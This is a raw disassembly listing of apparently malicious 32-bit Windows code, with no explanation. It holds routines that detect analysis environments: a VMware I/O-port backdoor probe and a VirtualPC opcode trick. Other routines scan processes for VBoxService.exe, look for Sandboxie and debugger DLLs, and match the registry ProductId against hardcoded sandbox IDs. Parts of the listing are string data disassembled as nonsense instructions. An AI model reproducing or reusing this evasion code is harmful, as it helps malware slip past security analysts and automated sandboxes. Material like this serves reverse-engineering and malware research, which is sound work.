  404f85:	6c                   	insb   (%dx),%es:(%edi)
  404f86:	68 65 6c 70 33       	push   $0x33706c65
  404f8b:	32 53 6e             	xor    0x6e(%ebx),%dl
  404f8e:	61                   	popa
  404f8f:	70 73                	jo     0x405004
  404f91:	68 6f 74 00 00       	push   $0x746f
  404f96:	00 00                	add    %al,(%eax)
  404f98:	48                   	dec    %eax
  404f99:	65 61                	gs popa
  404f9b:	70 33                	jo     0x404fd0
  404f9d:	32 4c 69 73          	xor    0x73(%ecx,%ebp,2),%cl
  404fa1:	74 46                	je     0x404fe9
  404fa3:	69 72 73 74 00 48 65 	imul   $0x65480074,0x73(%edx),%esi
  404faa:	61                   	popa
  404fab:	70 33                	jo     0x404fe0
  404fad:	32 4c 69 73          	xor    0x73(%ecx,%ebp,2),%cl
  404fb1:	74 4e                	je     0x405001
  404fb3:	65 78 74             	gs js  0x40502a
  404fb6:	00 00                	add    %al,(%eax)
  404fb8:	48                   	dec    %eax
  404fb9:	65 61                	gs popa
  404fbb:	70 33                	jo     0x404ff0
  404fbd:	32 46 69             	xor    0x69(%esi),%al
  404fc0:	72 73                	jb     0x405035
  404fc2:	74 00                	je     0x404fc4
  404fc4:	48                   	dec    %eax
  404fc5:	65 61                	gs popa
  404fc7:	70 33                	jo     0x404ffc
  404fc9:	32 4e 65             	xor    0x65(%esi),%cl
  404fcc:	78 74                	js     0x405042
  404fce:	00 00                	add    %al,(%eax)
  404fd0:	54                   	push   %esp
  404fd1:	6f                   	outsl  %ds:(%esi),(%dx)
  404fd2:	6f                   	outsl  %ds:(%esi),(%dx)
  404fd3:	6c                   	insb   (%dx),%es:(%edi)
  404fd4:	68 65 6c 70 33       	push   $0x33706c65
  404fd9:	32 52 65             	xor    0x65(%edx),%dl
  404fdc:	61                   	popa
  404fdd:	64 50                	fs push %eax
  404fdf:	72 6f                	jb     0x405050
  404fe1:	63 65 73             	arpl   %esp,0x73(%ebp)
  404fe4:	73 4d                	jae    0x405033
  404fe6:	65 6d                	gs insl (%dx),%es:(%edi)
  404fe8:	6f                   	outsl  %ds:(%esi),(%dx)
  404fe9:	72 79                	jb     0x405064
  404feb:	00 50 72             	add    %dl,0x72(%eax)
  404fee:	6f                   	outsl  %ds:(%esi),(%dx)
  404fef:	63 65 73             	arpl   %esp,0x73(%ebp)
  404ff2:	73 33                	jae    0x405027
  404ff4:	32 46 69             	xor    0x69(%esi),%al
  404ff7:	72 73                	jb     0x40506c
  404ff9:	74 00                	je     0x404ffb
  404ffb:	00 50 72             	add    %dl,0x72(%eax)
  404ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  404fff:	63 65 73             	arpl   %esp,0x73(%ebp)
  405002:	73 33                	jae    0x405037
  405004:	32 4e 65             	xor    0x65(%esi),%cl
  405007:	78 74                	js     0x40507d
  405009:	00 00                	add    %al,(%eax)
  40500b:	00 50 72             	add    %dl,0x72(%eax)
  40500e:	6f                   	outsl  %ds:(%esi),(%dx)
  40500f:	63 65 73             	arpl   %esp,0x73(%ebp)
  405012:	73 33                	jae    0x405047
  405014:	32 46 69             	xor    0x69(%esi),%al
  405017:	72 73                	jb     0x40508c
  405019:	74 57                	je     0x405072
  40501b:	00 50 72             	add    %dl,0x72(%eax)
  40501e:	6f                   	outsl  %ds:(%esi),(%dx)
  40501f:	63 65 73             	arpl   %esp,0x73(%ebp)
  405022:	73 33                	jae    0x405057
  405024:	32 4e 65             	xor    0x65(%esi),%cl
  405027:	78 74                	js     0x40509d
  405029:	57                   	push   %edi
  40502a:	00 00                	add    %al,(%eax)
  40502c:	54                   	push   %esp
  40502d:	68 72 65 61 64       	push   $0x64616572
  405032:	33 32                	xor    (%edx),%esi
  405034:	46                   	inc    %esi
  405035:	69 72 73 74 00 00 00 	imul   $0x74,0x73(%edx),%esi
  40503c:	54                   	push   %esp
  40503d:	68 72 65 61 64       	push   $0x64616572
  405042:	33 32                	xor    (%edx),%esi
  405044:	4e                   	dec    %esi
  405045:	65 78 74             	gs js  0x4050bc
  405048:	00 00                	add    %al,(%eax)
  40504a:	00 00                	add    %al,(%eax)
  40504c:	4d                   	dec    %ebp
  40504d:	6f                   	outsl  %ds:(%esi),(%dx)
  40504e:	64 75 6c             	fs jne 0x4050bd
  405051:	65 33 32             	xor    %gs:(%edx),%esi
  405054:	46                   	inc    %esi
  405055:	69 72 73 74 00 00 00 	imul   $0x74,0x73(%edx),%esi
  40505c:	4d                   	dec    %ebp
  40505d:	6f                   	outsl  %ds:(%esi),(%dx)
  40505e:	64 75 6c             	fs jne 0x4050cd
  405061:	65 33 32             	xor    %gs:(%edx),%esi
  405064:	4e                   	dec    %esi
  405065:	65 78 74             	gs js  0x4050dc
  405068:	00 00                	add    %al,(%eax)
  40506a:	00 00                	add    %al,(%eax)
  40506c:	4d                   	dec    %ebp
  40506d:	6f                   	outsl  %ds:(%esi),(%dx)
  40506e:	64 75 6c             	fs jne 0x4050dd
  405071:	65 33 32             	xor    %gs:(%edx),%esi
  405074:	46                   	inc    %esi
  405075:	69 72 73 74 57 00 00 	imul   $0x5774,0x73(%edx),%esi
  40507c:	4d                   	dec    %ebp
  40507d:	6f                   	outsl  %ds:(%esi),(%dx)
  40507e:	64 75 6c             	fs jne 0x4050ed
  405081:	65 33 32             	xor    %gs:(%edx),%esi
  405084:	4e                   	dec    %esi
  405085:	65 78 74             	gs js  0x4050fc
  405088:	57                   	push   %edi
  405089:	00 00                	add    %al,(%eax)
  40508b:	00 53 56             	add    %dl,0x56(%ebx)
  40508e:	8b f2                	mov    %edx,%esi
  405090:	8b d8                	mov    %eax,%ebx
  405092:	e8 79 fd ff ff       	call   0x404e10
  405097:	84 c0                	test   %al,%al
  405099:	74 0b                	je     0x4050a6
  40509b:	56                   	push   %esi
  40509c:	53                   	push   %ebx
  40509d:	ff 15 48 e9 40 00    	call   *0x40e948
  4050a3:	5e                   	pop    %esi
  4050a4:	5b                   	pop    %ebx
  4050a5:	c3                   	ret
  4050a6:	33 c0                	xor    %eax,%eax
  4050a8:	5e                   	pop    %esi
  4050a9:	5b                   	pop    %ebx
  4050aa:	c3                   	ret
  4050ab:	90                   	nop
  4050ac:	53                   	push   %ebx
  4050ad:	56                   	push   %esi
  4050ae:	8b f2                	mov    %edx,%esi
  4050b0:	8b d8                	mov    %eax,%ebx
  4050b2:	e8 59 fd ff ff       	call   0x404e10
  4050b7:	84 c0                	test   %al,%al
  4050b9:	74 0b                	je     0x4050c6
  4050bb:	56                   	push   %esi
  4050bc:	53                   	push   %ebx
  4050bd:	ff 15 60 e9 40 00    	call   *0x40e960
  4050c3:	5e                   	pop    %esi
  4050c4:	5b                   	pop    %ebx
  4050c5:	c3                   	ret
  4050c6:	33 c0                	xor    %eax,%eax
  4050c8:	5e                   	pop    %esi
  4050c9:	5b                   	pop    %ebx
  4050ca:	c3                   	ret
  4050cb:	90                   	nop
  4050cc:	53                   	push   %ebx
  4050cd:	56                   	push   %esi
  4050ce:	8b f2                	mov    %edx,%esi
  4050d0:	8b d8                	mov    %eax,%ebx
  4050d2:	e8 39 fd ff ff       	call   0x404e10
  4050d7:	84 c0                	test   %al,%al
  4050d9:	74 0b                	je     0x4050e6
  4050db:	56                   	push   %esi
  4050dc:	53                   	push   %ebx
  4050dd:	ff 15 64 e9 40 00    	call   *0x40e964
  4050e3:	5e                   	pop    %esi
  4050e4:	5b                   	pop    %ebx
  4050e5:	c3                   	ret
  4050e6:	33 c0                	xor    %eax,%eax
  4050e8:	5e                   	pop    %esi
  4050e9:	5b                   	pop    %ebx
  4050ea:	c3                   	ret
  4050eb:	90                   	nop
  4050ec:	55                   	push   %ebp
  4050ed:	8b ec                	mov    %esp,%ebp
  4050ef:	33 c0                	xor    %eax,%eax
  4050f1:	55                   	push   %ebp
  4050f2:	68 11 51 40 00       	push   $0x405111
  4050f7:	64 ff 30             	push   %fs:(%eax)
  4050fa:	64 89 20             	mov    %esp,%fs:(%eax)
  4050fd:	ff 05 40 e9 40 00    	incl   0x40e940
  405103:	33 c0                	xor    %eax,%eax
  405105:	5a                   	pop    %edx
  405106:	59                   	pop    %ecx
  405107:	59                   	pop    %ecx
  405108:	64 89 10             	mov    %edx,%fs:(%eax)
  40510b:	68 18 51 40 00       	push   $0x405118
  405110:	c3                   	ret
  405111:	e9 f6 c6 ff ff       	jmp    0x40180c
  405116:	eb f8                	jmp    0x405110
  405118:	5d                   	pop    %ebp
  405119:	c3                   	ret
  40511a:	8b c0                	mov    %eax,%eax
  40511c:	83 2d 40 e9 40 00 01 	subl   $0x1,0x40e940
  405123:	c3                   	ret
  405124:	31 c0                	xor    %eax,%eax
  405126:	68 4c 51 40 00       	push   $0x40514c
  40512b:	64 ff 30             	push   %fs:(%eax)
  40512e:	64 89 20             	mov    %esp,%fs:(%eax)
  405131:	b8 68 58 4d 56       	mov    $0x564d5868,%eax
  405136:	bb 12 f7 6c 3c       	mov    $0x3c6cf712,%ebx
  40513b:	b9 0a 00 00 00       	mov    $0xa,%ecx
  405140:	66 ba 58 56          	mov    $0x5658,%dx
  405144:	ed                   	in     (%dx),%eax
  405145:	b8 01 00 00 00       	mov    $0x1,%eax
  40514a:	eb 13                	jmp    0x40515f
  40514c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405150:	c7 80 b8 00 00 00 5d 	movl   $0x40515d,0xb8(%eax)
  405157:	51 40 00 
  40515a:	31 c0                	xor    %eax,%eax
  40515c:	c3                   	ret
  40515d:	31 c0                	xor    %eax,%eax
  40515f:	31 db                	xor    %ebx,%ebx
  405161:	64 8f 03             	pop    %fs:(%ebx)
  405164:	83 c4 04             	add    $0x4,%esp
  405167:	c3                   	ret
  405168:	55                   	push   %ebp
  405169:	b9 b2 51 40 00       	mov    $0x4051b2,%ecx
  40516e:	89 e5                	mov    %esp,%ebp
  405170:	53                   	push   %ebx
  405171:	51                   	push   %ecx
  405172:	64 ff 35 00 00 00 00 	push   %fs:0x0
  405179:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405180:	bb 00 00 00 00       	mov    $0x0,%ebx
  405185:	b8 01 00 00 00       	mov    $0x1,%eax
  40518a:	0f 3f                	(bad)
  40518c:	07                   	pop    %es
  40518d:	0b 36                	or     (%esi),%esi
  40518f:	8b 04 24             	mov    (%esp),%eax
  405192:	64 89 05 00 00 00 00 	mov    %eax,%fs:0x0
  405199:	83 c4 08             	add    $0x8,%esp
  40519c:	85 db                	test   %ebx,%ebx
  40519e:	0f 94 c0             	sete   %al
  4051a1:	36 8d 65 fc          	lea    %ss:-0x4(%ebp),%esp
  4051a5:	36 8b 1c 24          	mov    %ss:(%esp),%ebx
  4051a9:	36 8b 6c 24 04       	mov    %ss:0x4(%esp),%ebp
  4051ae:	83 c4 08             	add    $0x8,%esp
  4051b1:	c3                   	ret
  4051b2:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4051b6:	c7 81 a4 00 00 00 ff 	movl   $0xffffffff,0xa4(%ecx)
  4051bd:	ff ff ff 
  4051c0:	83 81 b8 00 00 00 04 	addl   $0x4,0xb8(%ecx)
  4051c7:	31 c0                	xor    %eax,%eax
  4051c9:	c3                   	ret
  4051ca:	c3                   	ret
  4051cb:	90                   	nop
  4051cc:	55                   	push   %ebp
  4051cd:	8b ec                	mov    %esp,%ebp
  4051cf:	81 c4 c8 fe ff ff    	add    $0xfffffec8,%esp
  4051d5:	53                   	push   %ebx
  4051d6:	56                   	push   %esi
  4051d7:	33 c0                	xor    %eax,%eax
  4051d9:	89 85 d4 fe ff ff    	mov    %eax,-0x12c(%ebp)
  4051df:	89 85 cc fe ff ff    	mov    %eax,-0x134(%ebp)
  4051e5:	89 85 c8 fe ff ff    	mov    %eax,-0x138(%ebp)
  4051eb:	89 85 d0 fe ff ff    	mov    %eax,-0x130(%ebp)
  4051f1:	33 c0                	xor    %eax,%eax
  4051f3:	55                   	push   %ebp
  4051f4:	68 c4 52 40 00       	push   $0x4052c4
  4051f9:	64 ff 30             	push   %fs:(%eax)
  4051fc:	64 89 20             	mov    %esp,%fs:(%eax)
  4051ff:	33 db                	xor    %ebx,%ebx
  405201:	33 d2                	xor    %edx,%edx
  405203:	b8 02 00 00 00       	mov    $0x2,%eax
  405208:	e8 7f fe ff ff       	call   0x40508c
  40520d:	8b f0                	mov    %eax,%esi
  40520f:	c7 85 d8 fe ff ff 28 	movl   $0x128,-0x128(%ebp)
  405216:	01 00 00 
  405219:	eb 70                	jmp    0x40528b
  40521b:	8d 85 d0 fe ff ff    	lea    -0x130(%ebp),%eax
  405221:	8d 95 fc fe ff ff    	lea    -0x104(%ebp),%edx
  405227:	b9 04 01 00 00       	mov    $0x104,%ecx
  40522c:	e8 f3 ca ff ff       	call   0x401d24
  405231:	8b 85 d0 fe ff ff    	mov    -0x130(%ebp),%eax
  405237:	8d 95 d4 fe ff ff    	lea    -0x12c(%ebp),%edx
  40523d:	e8 fe f4 ff ff       	call   0x404740
  405242:	8b 85 d4 fe ff ff    	mov    -0x12c(%ebp),%eax
  405248:	50                   	push   %eax
  405249:	8d 95 c8 fe ff ff    	lea    -0x138(%ebp),%edx
  40524f:	b8 dc 52 40 00       	mov    $0x4052dc,%eax
  405254:	e8 e7 f4 ff ff       	call   0x404740
  405259:	8b 85 c8 fe ff ff    	mov    -0x138(%ebp),%eax
  40525f:	e8 e4 cc ff ff       	call   0x401f48
  405264:	8b d0                	mov    %eax,%edx
  405266:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
  40526c:	e8 3b ca ff ff       	call   0x401cac
  405271:	8b 85 cc fe ff ff    	mov    -0x134(%ebp),%eax
  405277:	5a                   	pop    %edx
  405278:	e8 af cd ff ff       	call   0x40202c
  40527d:	85 c0                	test   %eax,%eax
  40527f:	7e 0a                	jle    0x40528b
  405281:	56                   	push   %esi
  405282:	e8 b1 e2 ff ff       	call   0x403538
  405287:	b3 01                	mov    $0x1,%bl
  405289:	eb 1b                	jmp    0x4052a6
  40528b:	8d 95 d8 fe ff ff    	lea    -0x128(%ebp),%edx
  405291:	8b c6                	mov    %esi,%eax
  405293:	e8 34 fe ff ff       	call   0x4050cc
  405298:	85 c0                	test   %eax,%eax
  40529a:	0f 85 7b ff ff ff    	jne    0x40521b
  4052a0:	56                   	push   %esi
  4052a1:	e8 92 e2 ff ff       	call   0x403538
  4052a6:	33 c0                	xor    %eax,%eax
  4052a8:	5a                   	pop    %edx
  4052a9:	59                   	pop    %ecx
  4052aa:	59                   	pop    %ecx
  4052ab:	64 89 10             	mov    %edx,%fs:(%eax)
  4052ae:	68 cb 52 40 00       	push   $0x4052cb
  4052b3:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
  4052b9:	ba 04 00 00 00       	mov    $0x4,%edx
  4052be:	e8 21 c8 ff ff       	call   0x401ae4
  4052c3:	c3                   	ret
  4052c4:	e9 43 c5 ff ff       	jmp    0x40180c
  4052c9:	eb e8                	jmp    0x4052b3
  4052cb:	8b c3                	mov    %ebx,%eax
  4052cd:	5e                   	pop    %esi
  4052ce:	5b                   	pop    %ebx
  4052cf:	8b e5                	mov    %ebp,%esp
  4052d1:	5d                   	pop    %ebp
  4052d2:	c3                   	ret
  4052d3:	00 ff                	add    %bh,%bh
  4052d5:	ff                   	(bad)
  4052d6:	ff                   	(bad)
  4052d7:	ff 0f                	decl   (%edi)
  4052d9:	00 00                	add    %al,(%eax)
  4052db:	00 56 42             	add    %dl,0x42(%esi)
  4052de:	6f                   	outsl  %ds:(%esi),(%dx)
  4052df:	78 53                	js     0x405334
  4052e1:	65 72 76             	gs jb  0x40535a
  4052e4:	69 63 65 2e 65 78 65 	imul   $0x6578652e,0x65(%ebx),%esp
  4052eb:	00 53 33             	add    %dl,0x33(%ebx)
  4052ee:	db 68 04             	fldt   0x4(%eax)
  4052f1:	53                   	push   %ebx
  4052f2:	40                   	inc    %eax
  4052f3:	00 e8                	add    %ch,%al
  4052f5:	ff e2                	jmp    *%edx
  4052f7:	ff                   	(bad)
  4052f8:	ff 85 c0 74 02 b3    	incl   -0x4cfd8b40(%ebp)
  4052fe:	01 8b c3 5b c3 00    	add    %ecx,0xc35bc3(%ebx)
  405304:	53                   	push   %ebx
  405305:	62 69 65             	bound  %ebp,0x65(%ecx)
  405308:	44                   	inc    %esp
  405309:	6c                   	insb   (%dx),%es:(%edi)
  40530a:	6c                   	insb   (%dx),%es:(%edi)
  40530b:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40530e:	6c                   	insb   (%dx),%es:(%edi)
  40530f:	00 53 33             	add    %dl,0x33(%ebx)
  405312:	db 68 28             	fldt   0x28(%eax)
  405315:	53                   	push   %ebx
  405316:	40                   	inc    %eax
  405317:	00 e8                	add    %ch,%al
  405319:	db e2                	fnclex
  40531b:	ff                   	(bad)
  40531c:	ff 85 c0 74 02 b3    	incl   -0x4cfd8b40(%ebp)
  405322:	01 8b c3 5b c3 00    	add    %ecx,0xc35bc3(%ebx)
  405328:	64 62 67 68          	bound  %esp,%fs:0x68(%edi)
  40532c:	65 6c                	gs insb (%dx),%es:(%edi)
  40532e:	70 2e                	jo     0x40535e
  405330:	64 6c                	fs insb (%dx),%es:(%edi)
  405332:	6c                   	insb   (%dx),%es:(%edi)
  405333:	00 53 81             	add    %dl,-0x7f(%ebx)
  405336:	c4                   	(bad)
  405337:	f4                   	hlt
  405338:	fe                   	(bad)
  405339:	ff                   	(bad)
  40533a:	ff 33                	push   (%ebx)
  40533c:	db 54 6a 01          	fistl  0x1(%edx,%ebp,2)
  405340:	6a 00                	push   $0x0
  405342:	68 9c 53 40 00       	push   $0x40539c
  405347:	68 02 00 00 80       	push   $0x80000002
  40534c:	e8 cf e1 ff ff       	call   0x403520
  405351:	85 c0                	test   %eax,%eax
  405353:	75 32                	jne    0x405387
  405355:	c7 44 24 04 01 01 00 	movl   $0x101,0x4(%esp)
  40535c:	00 
  40535d:	8d 44 24 04          	lea    0x4(%esp),%eax
  405361:	50                   	push   %eax
  405362:	8d 44 24 0c          	lea    0xc(%esp),%eax
  405366:	50                   	push   %eax
  405367:	6a 00                	push   $0x0
  405369:	6a 00                	push   $0x0
  40536b:	68 c8 53 40 00       	push   $0x4053c8
  405370:	8b 44 24 14          	mov    0x14(%esp),%eax
  405374:	50                   	push   %eax
  405375:	e8 ae e1 ff ff       	call   0x403528
  40537a:	8d 44 24 08          	lea    0x8(%esp),%eax
  40537e:	3d d4 53 40 00       	cmp    $0x4053d4,%eax
  405383:	75 02                	jne    0x405387
  405385:	b3 01                	mov    $0x1,%bl
  405387:	8b 04 24             	mov    (%esp),%eax
  40538a:	50                   	push   %eax
  40538b:	e8 68 e1 ff ff       	call   0x4034f8
  405390:	8b c3                	mov    %ebx,%eax
  405392:	81 c4 0c 01 00 00    	add    $0x10c,%esp
  405398:	5b                   	pop    %ebx
  405399:	c3                   	ret
  40539a:	00 00                	add    %al,(%eax)
  40539c:	53                   	push   %ebx
  40539d:	6f                   	outsl  %ds:(%esi),(%dx)
  40539e:	66 74 77             	data16 je 0x405418
  4053a1:	61                   	popa
  4053a2:	72 65                	jb     0x405409
  4053a4:	5c                   	pop    %esp
  4053a5:	4d                   	dec    %ebp
  4053a6:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4053ad:	74 5c                	je     0x40540b
  4053af:	57                   	push   %edi
  4053b0:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  4053b7:	43                   	inc    %ebx
  4053b8:	75 72                	jne    0x40542c
  4053ba:	72 65                	jb     0x405421
  4053bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4053bd:	74 56                	je     0x405415
  4053bf:	65 72 73             	gs jb  0x405435
  4053c2:	69 6f 6e 00 00 00 50 	imul   $0x50000000,0x6e(%edi),%ebp
  4053c9:	72 6f                	jb     0x40543a
  4053cb:	64 75 63             	fs jne 0x405431
  4053ce:	74 49                	je     0x405419
  4053d0:	64 00 00             	add    %al,%fs:(%eax)
  4053d3:	00 35 35 32 37 34    	add    %dh,0x34373235
  4053d9:	2d 36 34 30 2d       	sub    $0x2d303436,%eax
  4053de:	32 36                	xor    (%esi),%dh
  4053e0:	37                   	aaa
  4053e1:	33 30                	xor    (%eax),%esi
  4053e3:	36 34 2d             	ss xor $0x2d,%al
  4053e6:	32 33                	xor    (%ebx),%dh
  4053e8:	39 35 30 00 53 81    	cmp    %esi,0x81530030
  4053ee:	c4                   	(bad)
  4053ef:	f4                   	hlt
  4053f0:	fe                   	(bad)
  4053f1:	ff                   	(bad)
  4053f2:	ff 33                	push   (%ebx)
  4053f4:	db 54 6a 01          	fistl  0x1(%edx,%ebp,2)
  4053f8:	6a 00                	push   $0x0
  4053fa:	68 54 54 40 00       	push   $0x405454
  4053ff:	68 02 00 00 80       	push   $0x80000002
  405404:	e8 17 e1 ff ff       	call   0x403520
  405409:	85 c0                	test   %eax,%eax
  40540b:	75 32                	jne    0x40543f
  40540d:	c7 44 24 04 01 01 00 	movl   $0x101,0x4(%esp)
  405414:	00 
  405415:	8d 44 24 04          	lea    0x4(%esp),%eax
  405419:	50                   	push   %eax
  40541a:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40541e:	50                   	push   %eax
  40541f:	6a 00                	push   $0x0
  405421:	6a 00                	push   $0x0
  405423:	68 80 54 40 00       	push   $0x405480
  405428:	8b 44 24 14          	mov    0x14(%esp),%eax
  40542c:	50                   	push   %eax
  40542d:	e8 f6 e0 ff ff       	call   0x403528
  405432:	8d 44 24 08          	lea    0x8(%esp),%eax
  405436:	3d 8c 54 40 00       	cmp    $0x40548c,%eax
  40543b:	75 02                	jne    0x40543f
  40543d:	b3 01                	mov    $0x1,%bl
  40543f:	8b 04 24             	mov    (%esp),%eax
  405442:	50                   	push   %eax
  405443:	e8 b0 e0 ff ff       	call   0x4034f8
  405448:	8b c3                	mov    %ebx,%eax
  40544a:	81 c4 0c 01 00 00    	add    $0x10c,%esp
  405450:	5b                   	pop    %ebx
  405451:	c3                   	ret
  405452:	00 00                	add    %al,(%eax)
  405454:	53                   	push   %ebx
  405455:	6f                   	outsl  %ds:(%esi),(%dx)
  405456:	66 74 77             	data16 je 0x4054d0
  405459:	61                   	popa
  40545a:	72 65                	jb     0x4054c1
  40545c:	5c                   	pop    %esp
  40545d:	4d                   	dec    %ebp
  40545e:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  405465:	74 5c                	je     0x4054c3
  405467:	57                   	push   %edi
  405468:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  40546f:	43                   	inc    %ebx
  405470:	75 72                	jne    0x4054e4
  405472:	72 65                	jb     0x4054d9
  405474:	6e                   	outsb  %ds:(%esi),(%dx)
  405475:	74 56                	je     0x4054cd
  405477:	65 72 73             	gs jb  0x4054ed
  40547a:	69 6f 6e 00 00 00 50 	imul   $0x50000000,0x6e(%edi),%ebp
  405481:	72 6f                	jb     0x4054f2
  405483:	64 75 63             	fs jne 0x4054e9
  405486:	74 49                	je     0x4054d1
  405488:	64 00 00             	add    %al,%fs:(%eax)
  40548b:	00 37                	add    %dh,(%edi)
  40548d:	36 34 38             	ss xor $0x38,%al
  405490:	37                   	aaa
  405491:	2d 36 34 34 2d       	sub    $0x2d343436,%eax
  405496:	33 31                	xor    (%ecx),%esi
  405498:	37                   	aaa
  405499:	37                   	aaa
  40549a:	30 33                	xor    %dh,(%ebx)
  40549c:	37                   	aaa
  40549d:	2d 32 33 35 31       	sub    $0x31353332,%eax
  4054a2:	30 00                	xor    %al,(%eax)
  4054a4:	53                   	push   %ebx
  4054a5:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  4054ab:	33 db                	xor    %ebx,%ebx
  4054ad:	54                   	push   %esp
  4054ae:	6a 01                	push   $0x1
  4054b0:	6a 00                	push   $0x0
  4054b2:	68 0c 55 40 00       	push   $0x40550c
  4054b7:	68 02 00 00 80       	push   $0x80000002
  4054bc:	e8 5f e0 ff ff       	call   0x403520
  4054c1:	85 c0                	test   %eax,%eax
  4054c3:	75 32                	jne    0x4054f7
  4054c5:	c7 44 24 04 01 01 00 	movl   $0x101,0x4(%esp)
  4054cc:	00 
  4054cd:	8d 44 24 04          	lea    0x4(%esp),%eax
  4054d1:	50                   	push   %eax
  4054d2:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4054d6:	50                   	push   %eax
  4054d7:	6a 00                	push   $0x0
  4054d9:	6a 00                	push   $0x0
  4054db:	68 38 55 40 00       	push   $0x405538
  4054e0:	8b 44 24 14          	mov    0x14(%esp),%eax
  4054e4:	50                   	push   %eax
  4054e5:	e8 3e e0 ff ff       	call   0x403528
  4054ea:	8d 44 24 08          	lea    0x8(%esp),%eax
  4054ee:	3d 44 55 40 00       	cmp    $0x405544,%eax
  4054f3:	75 02                	jne    0x4054f7
  4054f5:	b3 01                	mov    $0x1,%bl
  4054f7:	8b 04 24             	mov    (%esp),%eax
  4054fa:	50                   	push   %eax
  4054fb:	e8 f8 df ff ff       	call   0x4034f8
  405500:	8b c3                	mov    %ebx,%eax
  405502:	81 c4 0c 01 00 00    	add    $0x10c,%esp
  405508:	5b                   	pop    %ebx
  405509:	c3                   	ret
  40550a:	00 00                	add    %al,(%eax)
  40550c:	53                   	push   %ebx
  40550d:	6f                   	outsl  %ds:(%esi),(%dx)
  40550e:	66 74 77             	data16 je 0x405588
  405511:	61                   	popa
  405512:	72 65                	jb     0x405579
  405514:	5c                   	pop    %esp
  405515:	4d                   	dec    %ebp
  405516:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40551d:	74 5c                	je     0x40557b
  40551f:	57                   	push   %edi
  405520:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  405527:	43                   	inc    %ebx
  405528:	75 72                	jne    0x40559c
  40552a:	72 65                	jb     0x405591
  40552c:	6e                   	outsb  %ds:(%esi),(%dx)
  40552d:	74 56                	je     0x405585
  40552f:	65 72 73             	gs jb  0x4055a5
  405532:	69 6f 6e 00 00 00 50 	imul   $0x50000000,0x6e(%edi),%ebp
  405539:	72 6f                	jb     0x4055aa
  40553b:	64 75 63             	fs jne 0x4055a1
  40553e:	74 49                	je     0x405589
  405540:	64 00 00             	add    %al,%fs:(%eax)
  405543:	00 37                	add    %dh,(%edi)
  405545:	36 34 38             	ss xor $0x38,%al
  405548:	37                   	aaa
  405549:	2d 33 33 37 2d       	sub    $0x2d373333,%eax
  40554e:	38 34 32             	cmp    %dh,(%edx,%esi,1)
  405551:	39 39                	cmp    %edi,(%ecx)
  405553:	35 35 2d 32 32       	xor    $0x32322d35,%eax
  405558:	36 31 34 00          	xor    %esi,%ss:(%eax,%eax,1)
  40555c:	55                   	push   %ebp
  40555d:	8b ec                	mov    %esp,%ebp
  40555f:	33 c9                	xor    %ecx,%ecx
  405561:	51                   	push   %ecx
  405562:	51                   	push   %ecx
  405563:	51                   	push   %ecx
  405564:	51                   	push   %ecx
  405565:	53                   	push   %ebx
  405566:	56                   	push   %esi
  405567:	57                   	push   %edi
  405568:	33 c0                	xor    %eax,%eax
  40556a:	55                   	push   %ebp
  40556b:	68 07 56 40 00       	push   $0x405607
  405570:	64 ff 30             	push   %fs:(%eax)
  405573:	64 89 20             	mov    %esp,%fs:(%eax)
  405576:	33 c0                	xor    %eax,%eax
  405578:	55                   	push   %ebp
  405579:	68 b2 55 40 00       	push   $0x4055b2
  40557e:	64 ff 30             	push   %fs:(%eax)
  405581:	64 89 20             	mov    %esp,%fs:(%eax)
  405584:	c7 45 fc 00 01 00 00 	movl   $0x100,-0x4(%ebp)
  40558b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40558e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405591:	e8 de ca ff ff       	call   0x402074
  405596:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405599:	50                   	push   %eax
  40559a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40559d:	e8 a6 c9 ff ff       	call   0x401f48
  4055a2:	50                   	push   %eax
  4055a3:	e8 30 df ff ff       	call   0x4034d8
  4055a8:	33 c0                	xor    %eax,%eax
  4055aa:	5a                   	pop    %edx
  4055ab:	59                   	pop    %ecx
  4055ac:	59                   	pop    %ecx
  4055ad:	64 89 10             	mov    %edx,%fs:(%eax)
  4055b0:	eb 12                	jmp    0x4055c4
  4055b2:	e9 29 c1 ff ff       	jmp    0x4016e0
  4055b7:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4055ba:	e8 01 c5 ff ff       	call   0x401ac0
  4055bf:	e8 d4 c2 ff ff       	call   0x401898
  4055c4:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4055c7:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4055ca:	e8 71 f1 ff ff       	call   0x404740
  4055cf:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4055d2:	50                   	push   %eax
  4055d3:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4055d6:	b8 20 56 40 00       	mov    $0x405620,%eax
  4055db:	e8 60 f1 ff ff       	call   0x404740
  4055e0:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4055e3:	58                   	pop    %eax
  4055e4:	e8 ab c8 ff ff       	call   0x401e94
  4055e9:	0f 94 c3             	sete   %bl
  4055ec:	33 c0                	xor    %eax,%eax
  4055ee:	5a                   	pop    %edx
  4055ef:	59                   	pop    %ecx
  4055f0:	59                   	pop    %ecx
  4055f1:	64 89 10             	mov    %edx,%fs:(%eax)
  4055f4:	68 0e 56 40 00       	push   $0x40560e
  4055f9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4055fc:	ba 03 00 00 00       	mov    $0x3,%edx
